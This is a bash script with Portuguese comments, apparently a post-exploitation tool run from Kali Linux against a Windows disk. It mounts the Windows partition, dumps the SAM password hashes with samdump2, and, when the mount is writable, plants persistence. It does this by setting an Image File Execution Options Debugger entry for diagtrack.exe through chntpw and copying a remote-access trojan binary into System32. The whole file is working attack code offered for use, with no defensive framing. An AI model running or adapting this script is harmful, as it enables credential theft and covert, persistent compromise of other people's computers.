#!/bin/bash

# --- CONFIGURAÇÕES ---
RAT_NAME="Windows.exe"
RAT_PATH="C:\\Windows\\System32\\$RAT_NAME"
# Caminho absoluto para evitar erros de variáveis vazias
DEST_DIR="/home/kali/Desktop/Post_Exploitation"
mkdir -p "$DEST_DIR"

echo "[+] Iniciando Automação ProMax (Modo Global - Forçado)..."

# 1. GERENCIAMENTO DE DISCO (FORÇADO)
# Identifica a partição do Windows (procurando pelo maior disco NTFS se necessário)
DRIVE=$(lsblk -pno NAME,FSTYPE | grep -i ntfs | awk '{print $1}' | head -n 1)
[ -z "$DRIVE" ] && DRIVE="/dev/sda4" # Fallback para o seu sda4

echo "[+] Alvo detectado: $DRIVE"
sudo umount "$DRIVE" 2>/dev/null

# Tenta montar ignorando explicitamente o arquivo de hibernação
mkdir -p /mnt/win_disk
sudo mount -t ntfs-3g -o remove_hiberfile "$DRIVE" /mnt/win_disk 2>/dev/null

# Se falhar, tentamos o modo 'ro' (Read-Only) que é suficiente para extrair hashes
if [ ! -f "/mnt/win_disk/Windows/System32/ntoskrnl.exe" ]; then
    echo "[!] Falha na montagem RW, tentando modo Read-Only para extração..."
    sudo mount -t ntfs-3g -o ro "$DRIVE" /mnt/win_disk
fi

MOUNT_POINT="/mnt/win_disk"
SOFTWARE="$MOUNT_POINT/Windows/System32/config/SOFTWARE"
SYSTEM="$MOUNT_POINT/Windows/System32/config/SYSTEM"
SAM="$MOUNT_POINT/Windows/System32/config/SAM"

# 2. EXTRAÇÃO DE HASHES
echo "[+] Extraindo Hashes..."
if sudo samdump2 "$SYSTEM" "$SAM" > "$DEST_DIR/hashes.txt"; then
    echo "[!] SUCESSO: Hashes salvos em $DEST_DIR/hashes.txt"
    # Mostra na tela para conferência imediata
    cat "$DEST_DIR/hashes.txt"
else
    echo "[#] ERRO: Falha crítica na extração de hashes."
fi

# 3. PERSISTÊNCIA (IFEO DIAGTRACK)
# Só tentamos se o disco estiver montado com escrita
if mount | grep "$MOUNT_POINT" | grep -q "rw"; then
    echo "[+] Aplicando persistência via DiagTrack..."
    printf "cd Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\nnk diagtrack.exe\ncd diagtrack.exe\nnv 1 Debugger\ned Debugger\n$RAT_PATH\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null
    
    # Injeção do seu binário C++
    if [ -f "./$RAT_NAME" ]; then
        sudo cp "./$RAT_NAME" "$MOUNT_POINT/Windows/System32/"
        echo "[+] Binário $RAT_NAME implantado."
    fi
else
    echo "[!] AVISO: Disco em modo Read-Only. Não foi possível injetar o IFEO."
fi

echo "--------------------------------------------------"
echo "[!] PROCESSO FINALIZADO."
